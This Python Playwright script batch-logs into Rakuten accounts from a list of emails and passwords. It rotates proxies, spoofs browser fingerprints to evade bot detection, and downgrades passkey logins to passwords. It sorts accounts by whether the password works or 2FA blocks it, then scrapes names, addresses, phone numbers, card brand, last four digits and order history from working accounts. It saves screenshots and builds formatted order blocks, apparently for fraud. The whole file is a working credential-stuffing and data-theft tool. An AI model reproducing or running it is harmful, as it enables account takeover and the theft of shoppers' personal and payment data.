# -*- coding: utf-8 -*-
"""
Production Rakuten Single/Cluster Worker & Deep Extractor
Features:
1. Resilient SSO authentication & automatic Passkey (WebAuthn) downgrade.
2. Full gateway intermediate screen handling (本人連絡先の選択 4-line address & クレジットカード情報の選択 card info).
3. Purchase history deep extraction with anti-date drift shop name regex and ブックス support.
4. Official order detail navigation (act=detail_page_view) with お届け先 and 支払い方法 parsing.
5. Statutory Bana 8-element order block synthesis.
6. Thread-safe queue runner with staggered startup, per-account BrowserContext isolation.
7. Atomic single-account JSON (result_{safe_acc}.json), real-time progress heartbeat (batch_progress.json), and summary (batch_summary.json).
8. Dynamic residential proxy pool rotation support.
"""
import os
import sys
import time
import json
import re
import queue
import random
import threading
import argparse
import traceback
from pathlib import Path
from playwright.sync_api import sync_playwright

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
window.navigator.chrome = { runtime: {} };
Object.defineProperty(navigator, 'languages', {get: () => ['ja-JP', 'ja', 'en-US', 'en']});
Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
"""

def clean(txt):
    return (txt or '').strip()

def clear_overlays(page):
    try:
        page.evaluate("""() => {
            const ids = ['onetrust-banner-sdk', 'onetrust-consent-sdk', 'cookie-banner', '_ra_cookie_banner'];
            for (const id of ids) {
                const el = document.getElementById(id);
                if (el) el.remove();
            }
            const modalOverlays = document.querySelectorAll('.ot-fade-in, [class*="modal-backdrop"], [class*="overlay"]');
            for (const m of modalOverlays) {
                m.remove();
            }
        }""")
    except Exception:
        pass

def handle_prompts_and_skips(page):
    try:
        clear_overlays(page)
        skip_clicked = page.evaluate("""() => {
            for (const el of document.querySelectorAll('button, a, div[role="button"]')) {
                const txt = el.innerText ? el.innerText.trim() : '';
                if (txt.includes('スキップしてログイン') || txt.includes('後で設定する')) {
                    el.click();
                    return true;
                }
            }
            return false;
        }""")
        if skip_clicked:
            time.sleep(2.5)
    except Exception:
        pass

def resilient_goto(page, url, wait_selector=None, max_retries=2, timeout=25000):
    for attempt in range(max_retries):
        try:
            page.goto(url, wait_until='domcontentloaded', timeout=timeout)
            handle_prompts_and_skips(page)
            if wait_selector:
                try:
                    page.wait_for_selector(wait_selector, timeout=6000, state='attached')
                except Exception:
                    pass
            time.sleep(1.5)
            handle_prompts_and_skips(page)
            return True
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(2.0)
            else:
                return False
    return False

def load_proxy_config(proxy_arg=None, proxy_file="data/proxy_pool.txt"):
    """支持显式代理、动态代理池与系统代理环境"""
    if proxy_arg:
        if proxy_arg.startswith('http://') or proxy_arg.startswith('https://'):
            return {'server': proxy_arg}
        parts = proxy_arg.split(':')
        if len(parts) == 4:
            return {
                'server': f"http://{parts[0]}:{parts[1]}",
                'username': parts[2],
                'password': parts[3]
            }
        elif len(parts) == 2:
            return {'server': f"http://{parts[0]}:{parts[1]}"}
            
    if proxy_file and os.path.exists(proxy_file):
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                p_str = random.choice(lines)
                parts = p_str.split(':')
                if len(parts) == 4:
                    return {
                        'server': f"http://{parts[0]}:{parts[1]}",
                        'username': parts[2],
                        'password': parts[3]
                    }
                elif len(parts) == 2:
                    return {'server': f"http://{parts[0]}:{parts[1]}"}
        except Exception as e:
            print(f"  ⚠️ 加载代理池失败: {e}", flush=True)
            
    env_p = os.environ.get('HTTPS_PROXY') or os.environ.get('HTTP_PROXY')
    if env_p:
        return {'server': env_p}
    return None

load_random_proxy = load_proxy_config

def extract_single_account(page, email, password, snaps_dir, safe_acc, worker_tag="W"):
    res = {
        'account_id': email,
        'email': email,
        'password': password,
        'worker_tag': worker_tag,
        'status': 'unknown',
        'profile': {
            'last_name': '', 'first_name': '',
            'last_name_kana': '', 'first_name_kana': '',
            'full_name': '', 'kana_name': '',
            'birthday': '', 'gender': '',
            'postal_code': '', 'address': '', 'phone': '',
            'card_brand': '', 'card_last4': '', 'card_holder': '', 'card_info': ''
        },
        'order_count': 0,
        'raw_orders': [],
        'bana_orders': [],
        'screenshots': [],
        'fully_captured': False
    }
    
    print(f"[{worker_tag}] 🚀 正在测试: {email}", flush=True)
    
    # 1. 官方 SSO 登录
    auth_url = "https://login.account.rakuten.com/sso/authorize?client_id=my_data_japan&response_type=code&scope=openid%20email%20profile&redirect_uri=https://mydata.id.rakuten.co.jp/mydata-api/auth/postlogin"
    try:
        page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
    except Exception as e:
        res['status'] = 'network_timeout'
        return res
    time.sleep(1.8)
    clear_overlays(page)
    
    u_in = page.locator('input#user_id, input[name="user_id"], input[type="text"]').first
    if not u_in.is_visible():
        time.sleep(1.5)
        u_in = page.locator('input#user_id, input[name="user_id"], input[type="text"]').first
    if not u_in.is_visible():
        res['status'] = 'login_page_error'
        return res
        
    u_in.fill(email)
    btn_next = page.locator('button:has-text("次へ"), button[type="submit"]').first
    if btn_next.count() > 0 and btn_next.is_visible():
        btn_next.click()
    else:
        u_in.press('Enter')
    time.sleep(2.0)
    
    body_txt = page.locator('body').inner_text() or ''
    if 'パスキー' in body_txt or 'webauthn' in page.url:
        switch_btn = page.locator('button:has-text("パスワード"), a:has-text("パスワード"), button:has-text("別の方法")').first
        if switch_btn.count() > 0 and switch_btn.is_visible():
            switch_btn.click()
            time.sleep(2.0)
            
    p_in = page.locator('input[type="password"], #password_current').first
    if not p_in.is_visible():
        time.sleep(1.5)
        p_in = page.locator('input[type="password"], #password_current').first
    if not p_in.is_visible():
        res['status'] = 'no_password_field'
        return res
        
    p_in.fill(password)
    btn_login = page.locator('button:has-text("ログイン"), button[type="submit"]').first
    if btn_login.count() > 0 and btn_login.is_visible():
        btn_login.click()
    else:
        p_in.press('Enter')
    time.sleep(3.5)
    
    # 检查登录结果与网关中转页
    for _ in range(5):
        body_txt = page.locator('body').inner_text() or ''
        
        # 网关第 1 页: 本人連絡先の選択 (4行物理地址)
        if '本人連絡先の選択' in body_txt or '連絡先' in body_txt:
            snap_gw1 = snaps_dir / f"{safe_acc}_gateway_contact.png"
            try:
                page.screenshot(path=str(snap_gw1))
                res['screenshots'].append(str(snap_gw1))
            except Exception: pass
            
            m_post = re.search(r'郵便番号[^\d]*(\d{3}-\d{4})', body_txt)
            m_pref = re.search(r'都道府県[^\n]*\n+([^\n]+)', body_txt)
            m_city = re.search(r'郡市区[^\n]*\n+([^\n]+)', body_txt)
            m_strt = re.search(r'それ以降の住所[^\n]*\n+([^\n]+)', body_txt)
            m_ph = re.search(r'電話番号[^\n]*\n+([0\d\-]+)', body_txt)
            
            if m_post and m_pref and m_city and m_strt:
                pcode = f"〒{m_post.group(1)}"
                pref = m_pref.group(1).strip()
                city = m_city.group(1).strip()
                strt = m_strt.group(1).strip()
                ph = m_ph.group(1).strip() if m_ph else ""
                res['profile']['postal_code'] = pcode
                res['profile']['phone'] = ph
                res['profile']['address'] = f"{pcode}\n{pref} {city}\n{strt}\n{ph}".strip()
                
            next_btn = page.locator('input[type="submit"][value="次へ"], button:has-text("次へ")').first
            if next_btn.count() > 0 and next_btn.is_visible():
                next_btn.click()
                time.sleep(2.5)
                body_txt = page.locator('body').inner_text() or ''
                
        # 网关第 2 页: クレジットカード情報の選択
        if 'クレジットカード情報の選択' in body_txt or '登録済み クレジットカード情報' in body_txt:
            snap_gw2 = snaps_dir / f"{safe_acc}_gateway_card.png"
            try:
                page.screenshot(path=str(snap_gw2))
                res['screenshots'].append(str(snap_gw2))
            except Exception: pass
            
            m_brand = re.search(r'カード会社[^\n]*\n+([A-Za-z]+)', body_txt)
            m_l4 = re.search(r'カード番号[^\n]*下4桁:\s*(\d{4})', body_txt)
            m_hld = re.search(r'カード名義人[^\n]*\n+([^\n]+)', body_txt)
            
            if m_brand and m_l4:
                brand = m_brand.group(1).strip()
                l4 = m_l4.group(1).strip()
                holder = m_hld.group(1).strip() if m_hld else ""
                res['profile']['card_brand'] = brand
                res['profile']['card_last4'] = l4
                res['profile']['card_info'] = f"{brand} **** {l4}"
                res['profile']['card_holder'] = holder
                
            next_btn = page.locator('input[type="submit"][value="次へ"], button:has-text("次へ")').first
            if next_btn.count() > 0 and next_btn.is_visible():
                next_btn.click()
                time.sleep(2.5)
                
        if 'ユーザIDまたはパスワードが正しくありません' in body_txt or '入力内容をご確認ください' in body_txt or 'ワンタイムパスワード' in body_txt:
            break
        if 'postlogin' in page.url or 'order-list' in page.url or 'mydata' in page.url:
            break
        time.sleep(1.2)
        
    body_txt = page.locator('body').inner_text() or ''
    if 'ユーザIDまたはパスワードが正しくありません' in body_txt or '入力内容をご確認ください' in body_txt:
        res['status'] = 'wrong_password'
        print(f"[{worker_tag}] ❌ 密码错误: {email}", flush=True)
        return res
    if 'ワンタイムパスワード' in body_txt or '2段階認証' in body_txt:
        res['status'] = 'two_factor'
        print(f"[{worker_tag}] ⚠️ 需2FA: {email}", flush=True)
        return res
        
    res['status'] = 'active'
    
    # 2. 访问官方购买履历
    try:
        page.goto('https://order.my.rakuten.co.jp/purchase-history/order-list', wait_until='domcontentloaded', timeout=25000)
    except Exception:
        pass
    time.sleep(3.0)
    clear_overlays(page)
    
    snap_ord = snaps_dir / f"{safe_acc}_orders_list.png"
    try:
        page.screenshot(path=str(snap_ord), full_page=True)
        res['screenshots'].append(str(snap_ord))
    except Exception:
        pass
        
    page_txt = page.locator('body').inner_text() or ''
    
    # 提取姓名
    m_hdr = re.search(r'([^\s\n\r]+)\s+([^\s\n\r]+)\s*さん\s*利用可能ポイント', page_txt)
    if not m_hdr:
        m_hdr = re.search(r'([^\s\n\r]+)\s+([^\s\n\r]+)\s*さん', page_txt)
    if m_hdr:
        res['profile']['last_name'] = m_hdr.group(1).strip()
        res['profile']['first_name'] = m_hdr.group(2).strip()
        res['profile']['full_name'] = f"{res['profile']['last_name']} {res['profile']['first_name']}"
        
    ord_num_re = re.compile(r'(\d{6}-\d{8}-\d{8})')
    date_re = re.compile(r'(\d{4}[/\-年]\d{1,2}[/\-月]\d{1,2}[^\n]*)')
    price_re = re.compile(r'([\d,]+)\s*円')
    
    lines = [l.strip() for l in page_txt.split('\n') if l.strip()]
    indices = []
    for idx, line in enumerate(lines):
        m = ord_num_re.search(line)
        if m:
            indices.append((idx, m.group(1)))
            
    orders_extracted = []
    for idx, ord_no in indices:
        start_w = max(0, idx - 4)
        end_w = min(len(lines), idx + 8)
        window = lines[start_w:end_w]
        
        ord_date = ''
        for w in window:
            dm = date_re.search(w)
            if dm and '注文番号' not in w:
                ord_date = dm.group(1).replace('年', '/').replace('月', '/')
                break
                
        price = ''
        for w in window:
            if '注文番号' in w or '注文日' in w: continue
            pm = price_re.search(w)
            if pm:
                val = pm.group(1)
                if val not in ['1,980', '1980', '2024', '2025', '2026', '2023', '2022', '30,000']:
                    price = val + '円'
                    break
        if not price:
            for w in window:
                pm = price_re.search(w)
                if pm:
                    price = pm.group(1) + '円'
                    break
                    
        # 精准匹配店铺名称，杜绝日期漂移
        shop = ''
        for k in range(max(0, idx - 6), idx):
            cand = lines[k].strip()
            if any(x in cand for x in ['ショップ', '公式', '店', 'Market', 'Store', 'LOVE', 'Love', '堂', '屋', '舎', '倶楽部', 'ブックス']):
                shop = cand
                break
        if not shop:
            for w in window[:idx - start_w]:
                if any(x in w for x in ['ショップ', '公式', '店', 'Market', 'Store', 'LOVE', 'Love', '堂', '屋', '舎', '倶楽部', 'ブックス']):
                    shop = w
                    break
        if not shop and window:
            candidate = window[0]
            if not ord_num_re.search(candidate) and '注文' not in candidate and not date_re.search(candidate):
                shop = candidate
        if not shop:
            shop = "楽天市場店舗"
                
        item = '商品'
        for w in window[idx - start_w + 1:]:
            if len(w) > 4 and '注文' not in w and not price_re.search(w) and '数量' not in w and '39ショップ' not in w:
                item = w
                break
                
        orders_extracted.append({
            'order_number': ord_no,
            'order_date': ord_date or '2024/01/01',
            'shop_name': shop,
            'item_name': item,
            'price_yen': price or '1,000円',
            'quantity': '1'
        })
        
    res['order_count'] = len(orders_extracted)
    res['raw_orders'] = orders_extracted
    
    # 3. 访问注文詳細原件
    detail_links = page.evaluate("""() => {
        const list = [];
        for (const a of document.querySelectorAll('a')) {
            const href = a.getAttribute('href') || '';
            if (href.includes('act=detail_page_view') || (a.innerText && a.innerText.includes('注文詳細'))) {
                list.push(href);
            }
        }
        return list;
    }""")
    
    target_detail_url = None
    for dl in detail_links:
        if 'act=detail_page_view' in dl:
            target_detail_url = dl
            break
    if not target_detail_url and detail_links:
        target_detail_url = detail_links[0]
        
    if target_detail_url:
        if not target_detail_url.startswith('http'):
            target_detail_url = "https://order.my.rakuten.co.jp" + target_detail_url
        try:
            page.goto(target_detail_url, wait_until='domcontentloaded', timeout=25000)
            time.sleep(3.0)
            
            snap_det = snaps_dir / f"{safe_acc}_order_detail.png"
            page.screenshot(path=str(snap_det), full_page=True)
            res['screenshots'].append(str(snap_det))
            
            det_txt = page.locator('body').inner_text() or ''
            
            # 解析お届け先
            m_deliv = re.search(r'お届け先\s*\n+([^\n]+)\s*\n+(〒\s*\d{3}-\d{4})\s*\n+([^\n]+)\s*\n+([0\d\-]+)', det_txt)
            if m_deliv:
                deliv_name = m_deliv.group(1).strip()
                deliv_post = m_deliv.group(2).strip().replace(' ', '')
                deliv_addr = m_deliv.group(3).strip()
                deliv_phone = m_deliv.group(4).strip()
                res['profile']['postal_code'] = deliv_post
                res['profile']['phone'] = deliv_phone
                res['profile']['address'] = f"{deliv_post}\n{deliv_addr}\n{deliv_phone}"
                if not res['profile']['full_name']:
                    res['profile']['full_name'] = deliv_name
                    name_parts = deliv_name.split()
                    if len(name_parts) >= 2:
                        res['profile']['last_name'] = name_parts[0]
                        res['profile']['first_name'] = name_parts[1]
                        
            # 解析支払い方法
            m_pay = re.search(r'支払い方法\s*\n+([^\n]+)\s*\n+([A-Za-z]+)\s*\*+\s*(\d{4})\s*\n+([^\n]+)', det_txt)
            if m_pay:
                card_brand = m_pay.group(2).strip()
                card_last4 = m_pay.group(3).strip()
                card_holder = m_pay.group(4).strip()
                res['profile']['card_brand'] = card_brand
                res['profile']['card_last4'] = card_last4
                res['profile']['card_info'] = f"{card_brand} **** {card_last4}"
                res['profile']['card_holder'] = card_holder
        except Exception:
            pass
            
    # 4. 组装 Bana 8 要素法定订单块
    target_name = res['profile']['full_name']
    target_card = res['profile']['card_info']
    target_holder = res['profile']['card_holder'] or target_name
    target_addr_block = res['profile']['address']
    
    addr_part = f"\n{target_addr_block}" if target_addr_block else ""
    card_part = f"\n{target_card}\n{target_holder}" if target_card else ""
        
    bana_blocks = []
    for o in orders_extracted[:3]:
        block = (
            f"{o['shop_name']}\n"
            f"注文日時：\n{o['order_date']}\n"
            f"注文番号：\n{o['order_number']} | {o['item_name']} | {o['price_yen']} | 数量：\n{o['quantity']} | "
            f"お届け先\n{target_name}{addr_part} | "
            f"注文者情報\n{target_name}{addr_part}\n{email} | "
            f"支払い方法\nクレジットカード決済(一括払い){card_part}"
        )
        bana_blocks.append(block)
    res['bana_orders'] = bana_blocks
    
    # 判定是否完整抓全数据
    has_orders = res['order_count'] > 0
    has_addr = bool(res['profile']['address'])
    has_card = bool(res['profile']['card_info'])
    
    if res['status'] == 'active' and has_orders and (has_addr or has_card):
        res['fully_captured'] = True
        print(f"[{worker_tag}] 🌟 成功捕获全要素: {email} | 订单: {res['order_count']}", flush=True)
    elif res['status'] == 'active':
        print(f"[{worker_tag}] ✅ 活跃账号: {email} (订单: {res['order_count']})", flush=True)
        
    return res

class NodeClusterBatchRunner:
    def __init__(self, input_file, output_dir, workers=3, max_seconds=900, proxy_file=None, proxy_arg=None):
        self.input_file = Path(input_file)
        self.out_dir = Path(output_dir)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.snaps_dir = self.out_dir / "screenshots"
        self.snaps_dir.mkdir(parents=True, exist_ok=True)
        
        self.workers_count = workers
        self.max_seconds = max_seconds
        self.proxy_file = proxy_file
        self.proxy_arg = proxy_arg
        self.stop_event = threading.Event()
        self.account_queue = queue.Queue()
        self.lock = threading.Lock()
        
        self.start_time = time.time()
        self.results = []
        self.in_flight = {}
        
        self.stats = {
            'total_accounts': 0,
            'processed_count': 0,
            'active_count': 0,
            'fully_captured_count': 0,
            'wrong_password_count': 0,
            'two_factor_count': 0,
            'other_failed_count': 0,
            'total_orders_extracted': 0,
            'address_captured_count': 0,
            'card_captured_count': 0,
            'start_time': self.start_time,
            'elapsed_seconds': 0,
            'is_running': True,
            'in_flight': {},
            'successful_accounts_summary': []
        }
        
    def load_accounts(self):
        with open(self.input_file, 'r', encoding='utf-8') as f:
            accs = json.load(f)
        self.stats['total_accounts'] = len(accs)
        for a in accs:
            self.account_queue.put(a)
        print(f"📦 [Runner] 载入待测账号 {len(accs)} 户 | 配置并发 Worker: {self.workers_count}", flush=True)
        
    def update_progress_file(self):
        with self.lock:
            self.stats['elapsed_seconds'] = round(time.time() - self.start_time, 1)
            self.stats['in_flight'] = dict(self.in_flight)
            p_file = self.out_dir / "batch_progress.json"
            p_file.write_text(json.dumps(self.stats, ensure_ascii=False, indent=2), encoding='utf-8')
            
    def record_account_result(self, res):
        with self.lock:
            self.results.append(res)
            self.stats['processed_count'] += 1
            st = res.get('status')
            if st == 'active':
                self.stats['active_count'] += 1
                if res.get('fully_captured'):
                    self.stats['fully_captured_count'] += 1
                if res['profile'].get('address'):
                    self.stats['address_captured_count'] += 1
                if res['profile'].get('card_info'):
                    self.stats['card_captured_count'] += 1
                self.stats['total_orders_extracted'] += res.get('order_count', 0)
                
                raw_ords = res.get('raw_orders', [])
                self.stats['successful_accounts_summary'].append({
                    'email': res.get('email'),
                    'name': res['profile'].get('full_name'),
                    'address': res['profile'].get('address', '').replace('\n', ' | '),
                    'card_info': res['profile'].get('card_info'),
                    'order_count': res.get('order_count', 0),
                    'shops': [o.get('shop_name') for o in raw_ords[:3]]
                })
            elif st == 'wrong_password':
                self.stats['wrong_password_count'] += 1
            elif st == 'two_factor':
                self.stats['two_factor_count'] += 1
            else:
                self.stats['other_failed_count'] += 1
                
        safe_acc = res['email'].replace('@', '_').replace('.', '_')
        single_p = self.out_dir / f"result_{safe_acc}.json"
        single_p.write_text(json.dumps(res, ensure_ascii=False, indent=2), encoding='utf-8')
        
    def worker_thread_loop(self, worker_id):
        worker_tag = f"W{worker_id}"
        print(f"🛠️ [{worker_tag}] 线程启动", flush=True)
        
        proxy_config = load_proxy_config(self.proxy_arg, self.proxy_file)
        if proxy_config:
            print(f"[{worker_tag}] 🌐 挂载代理: {proxy_config.get('server')}", flush=True)
        
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            
            while not self.stop_event.is_set():
                if time.time() - self.start_time >= self.max_seconds:
                    break
                    
                try:
                    acc = self.account_queue.get(timeout=2.0)
                except queue.Empty:
                    break
                    
                email = acc['email']
                pwd = acc['password']
                safe_acc = email.replace('@', '_').replace('.', '_')
                
                with self.lock:
                    self.in_flight[worker_tag] = email
                self.update_progress_file()
                
                context = browser.new_context(
                    locale='ja-JP',
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
                )
                context.add_init_script(STEALTH_JS)
                page = context.new_page()
                page.set_default_timeout(35000)
                
                try:
                    res = extract_single_account(page, email, pwd, self.snaps_dir, safe_acc, worker_tag)
                    self.record_account_result(res)
                except Exception as exc:
                    print(f"[{worker_tag}] ❌ 异常: {email} - {exc}", flush=True)
                    self.record_account_result({
                        'account_id': email,
                        'email': email,
                        'password': pwd,
                        'status': 'worker_exception',
                        'error': str(exc)
                    })
                finally:
                    try: context.close()
                    except Exception: pass
                    with self.lock:
                        if worker_tag in self.in_flight:
                            del self.in_flight[worker_tag]
                    self.account_queue.task_done()
                    self.update_progress_file()
                    
                time.sleep(1.5)
                
            browser.close()
        print(f"🛑 [{worker_tag}] 线程正常终止", flush=True)
        
    def progress_heartbeat_loop(self):
        while not self.stop_event.is_set():
            time.sleep(5.0)
            self.update_progress_file()
            elapsed = time.time() - self.start_time
            if elapsed >= self.max_seconds:
                self.stop_event.set()
                break
                
    def run(self):
        self.load_accounts()
        
        hb_thread = threading.Thread(target=self.progress_heartbeat_loop, daemon=True)
        hb_thread.start()
        
        threads = []
        for i in range(1, self.workers_count + 1):
            t = threading.Thread(target=self.worker_thread_loop, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(1.0)
            
        for t in threads:
            t.join()
            
        self.stop_event.set()
        with self.lock:
            self.stats['is_running'] = False
            self.stats['elapsed_seconds'] = round(time.time() - self.start_time, 1)
        self.update_progress_file()
        
        summary_file = self.out_dir / "batch_summary.json"
        summary_file.write_text(json.dumps(self.results, ensure_ascii=False, indent=2), encoding='utf-8')
        print(f"\n🎉 [Runner 运行完毕] 累计测试: {self.stats['processed_count']} | 正常活跃: {self.stats['active_count']} | 抓全要素: {self.stats['fully_captured_count']}", flush=True)
        return self.results

def main():
    parser = argparse.ArgumentParser(description="Rakuten Extraction Worker")
    parser.add_argument('--input', type=str, default='accounts.json', help='Input accounts JSON')
    parser.add_argument('--output-dir', type=str, default='data/run_results', help='Output directory')
    parser.add_argument('--workers', type=int, default=3, help='Concurrent worker threads')
    parser.add_argument('--max-seconds', type=int, default=900, help='Max execution seconds')
    parser.add_argument('--proxy-file', type=str, default=None, help='Proxy list file')
    parser.add_argument('--proxy', type=str, default=None, help='Explicit proxy URL (e.g. http://127.0.0.1:7891)')
    # Backward-compatible parameters
    parser.add_argument('--worker-id', type=int, default=None, help='Legacy worker id')
    parser.add_argument('--num-workers', type=int, default=None, help='Legacy num workers')
    args = parser.parse_args()
    
    workers = args.workers
    if args.num_workers and not args.workers:
        workers = args.num_workers
        
    runner = NodeClusterBatchRunner(
        input_file=args.input,
        output_dir=args.output_dir,
        workers=workers,
        max_seconds=args.max_seconds,
        proxy_file=args.proxy_file,
        proxy_arg=args.proxy
    )
    runner.run()

if __name__ == '__main__':
    main()
